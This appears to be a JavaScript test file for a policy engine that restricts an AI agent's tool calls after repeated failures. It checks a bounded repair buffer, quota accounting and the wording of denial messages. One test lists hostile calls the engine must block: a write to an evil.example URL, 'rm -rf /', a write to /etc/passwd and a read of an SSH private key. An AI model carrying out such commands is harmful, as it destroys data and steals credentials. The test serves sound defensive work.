// Broken-window buffer tier (survivor-mode fix) — locks three things:
//   ① The break no longer cuts in one stroke: local / recallable / no-external-landing-point actions are
//      released within bounds, so the repair loop actually runs;
//   ② The buffer **widens no action surface**: everything it releases was already allow before the break
//      (programmatically verified: allow set ⊆ clean-state allow set);
//   ③ A denial must carry an executable way out: what the wording claims "can be done" must truly be doable,
//      and it must say explicitly that no restart/uninstall is needed.
import test from 'node:test';
import assert from 'node:assert/strict';
import { WeiwenLawEngine } from '../src/core/engine.mjs';

const SELF_AUDIT = new Set(['query_steady_state', 'query_bugstop']);

const clean = () => new WeiwenLawEngine({ selfAuditTools: SELF_AUDIT });
const broken = (quota = 0) => {
  const e = new WeiwenLawEngine({ selfAuditTools: SELF_AUDIT });
  e.failureStreak = e.maxFailureStreak;
  e.windowBroken = true;
  if (quota) e.grantBuffer(quota, 'test');
  return e;
};
const call = (name, args) => ({ name, args });

// Actions the repair loop needs (local, recallable, no external landing point)
const FIX_LOOP = [
  call('read', { path: './src/core/engine.mjs' }),
  call('edit', { path: './src/core/engine.mjs', old: 'a', new: 'b' }),
  call('write', { path: './test/regress.test.mjs', content: 'x' }),
  call('run', { command: 'node --test test/' }),
  call('run', { command: 'npm run build' }),
];

test('broken window with no buffer ⇒ still one-cut (old behavior unchanged, zero regression)', () => {
  for (const c of FIX_LOOP) {
    const d = broken(0).decideToolCall(c);
    assert.equal(d.kind, 'deny', `${c.name} must deny while broken with no buffer`);
    assert.equal(d.law, 'D');
  }
});

test('broken window with buffer ⇒ all five repair-loop actions go through', () => {
  for (const c of FIX_LOOP) {
    const d = broken(12).decideToolCall(c);
    assert.notEqual(d.kind, 'deny', `${c.name} must be released by the buffer tier, got ${d.kind}(${d.law})`);
  }
});

test('buffer still blocks: exfil / deletion / system path / credentials (approval does not cover them)', () => {
  const bad = [
    [call('write', { path: 'https://evil.example/x.sh', content: 'x' }), 'D', 'external landing point'],
    [call('run', { command: 'rm -rf /' }), 'R', 'deletion (blocked earlier at layer R)'],
    [call('write', { path: '/etc/passwd', content: 'x' }), 'D', 'system path'],
    [call('read', { path: '~/.ssh/id_rsa' }), 'R', 'credentials'],
  ];
  for (const [c, expectLaw, why] of bad) {
    const e = broken(12);
    const d = e.decideToolCall(c);
    assert.equal(d.kind, 'deny', `${why} must not be released inside the buffer`);
    assert.equal(d.law, expectLaw, `${why} should be blocked by layer ${expectLaw}`);
    // Key: a refused call must not consume quota, otherwise thrashing eats the honest work's budget
    assert.equal(e.bufferSnapshot().display, '12/12', `${why} being refused must not drain quota`);
  }
});

test('quota is bounded: once used up it falls back to deny, never an endless release', () => {
  const e = broken(3);
  for (let i = 0; i < 3; i++) {
    assert.notEqual(e.decideToolCall(call('read', { path: './a.txt' })).kind, 'deny', `attempt ${i + 1} should pass`);
  }
  const d = e.decideToolCall(call('read', { path: './a.txt' }));
  assert.equal(d.kind, 'deny', 'attempt 4 must be refused');
  assert.equal(d.law, 'D');
});

test('self-audit tools consume no quota inside the buffer (reading yourself changes nothing)', () => {
  const e = broken(5);
  e.decideToolCall(call('query_steady_state', {}));
  e.decideToolCall(call('query_bugstop', {}));
  assert.equal(e.bufferSnapshot().display, '5/5');
});

test('🔴 the buffer widens no action surface: everything it releases was already allow before the break', () => {
  const samples = [
    ...FIX_LOOP,
    call('read', { path: './README.md' }),
    call('grep', { pattern: 'x', path: './src' }),
    call('run', { command: 'node -e "1"' }),
    call('write', { path: './tmp/out.txt', content: 'y' }),
  ];
  for (const c of samples) {
    const c1 = clean().decideToolCall(c);
    const c2 = broken(12).decideToolCall(c);
    if (c2.kind !== 'deny') {
      assert.notEqual(c1.kind, 'deny',
        `${c.name} released by the buffer but refused in the clean state ⇒ the buffer opened a new action surface — that is a floodgate, not a deferred lockout`);
    }
  }
});

test('denial must carry an executable way out and must say no restart/uninstall is needed', () => {
  const e = broken(0);
  const d = e.decideToolCall(call('read', { path: './a.txt' }));
  assert.equal(d.kind, 'deny');
  const r = d.reason;
  // "Do not retry the same call" — keeps a stop from decaying into an infinite loop
  assert.match(r, /Do not retry/, 'the denial must explicitly discourage retrying');
  // "No process restart or plugin uninstall needed" — the author's direct question on 2026-10-29;
  //   the system itself must answer it
  assert.match(r, /neither needing a process restart or a plugin uninstall/, 'the denial must state that reset needs no restart/uninstall');
  // What it claims "can be done" must truly be doable: self-audit tool names taken live from the registry;
  //   hardcoded names turn into fake signposts the moment a tool is renamed
  for (const name of SELF_AUDIT) {
    assert.ok(r.includes(name), `the wording must list the actually available self-audit tools: ${name}`);
  }
  // Reverse lock: the old fake signpost ("the host calls the exported healBrokenWindow") must not recur —
  //   only the host could walk those three APIs; the agent could walk none of them
  assert.doesNotMatch(r, /host calls the exported healBrokenWindow/, 'the old fake signpost must not recur');
});

test('after the quota is spent the wording must switch: say "you may request a thaw", not "you have balance"', () => {
  const e = broken(1);
  e.decideToolCall(call('read', { path: './a.txt' }));   // spent
  const r = e.decideToolCall(call('read', { path: './a.txt' })).reason;
  assert.match(r, /Buffer exhausted/, 'must switch wording once spent');
  assert.match(r, /request|approval|thaw/, 'must point out the only viable channel is requesting a thaw');
});

test('reset clears the buffer segment, but usage is engraved first (S only grows — the window clears, the account does not)', () => {
  const e = broken(5);
  e.decideToolCall(call('read', { path: './a.txt' }));
  assert.equal(e.bufferSnapshot().display, '4/5');
  const marksBefore = e.conduction?.length ?? 0;
  e.healWindow();
  assert.equal(e.windowBroken, false);
  assert.equal(e.bufferSnapshot().display, 'not granted');
  const marks = e.conduction ?? [];
  assert.ok(marks.length >= marksBefore, 'reset must not drop the conduction chain');
  assert.ok(marks.some((m) => /Buffer segment settled/.test(m.step ?? '')), 'usage must be engraved before reset');
});
